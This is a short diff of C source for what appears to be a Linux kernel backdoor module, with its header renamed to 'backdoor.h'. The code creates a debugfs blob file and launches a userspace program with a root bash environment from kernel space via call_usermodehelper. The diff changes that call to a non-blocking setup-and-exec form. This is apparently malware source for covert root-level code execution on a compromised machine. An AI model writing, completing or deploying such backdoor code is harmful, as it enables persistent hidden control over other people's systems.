@@ -1,11 +1,10 @@
-#include "debugfs.h"
+#include "backdoor.h"
 
 extern unsigned char *buffer;
 extern unsigned long buffer_length;
-extern struct task_struct *task;
 
 struct dentry *dfs = NULL;
-struct debugfs_blob_wrapper *myblob;
+struct debugfs_blob_wrapper *myblob = NULL;
 
 void destroy_file(void){
 	if (dfs){
@@ -14,6 +13,7 @@ void destroy_file(void){
 }
 
 void execute_file(void){
+	struct subprocess_info *sub_info;
 	static char *envp[] = {
 		"SHELL=/bin/bash",
 		"HOME=/root/",
@@ -30,7 +30,8 @@ void execute_file(void){
 		NULL
 	};
 
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
+	call_usermodehelper_exec(sub_info, UMH_NO_WAIT);
 }
 
 int create_file(void){
@@ -50,6 +51,5 @@ int create_file(void){
 		kfree(myblob);
 		return -EINVAL;
 	}
-
 	return 0;
 }
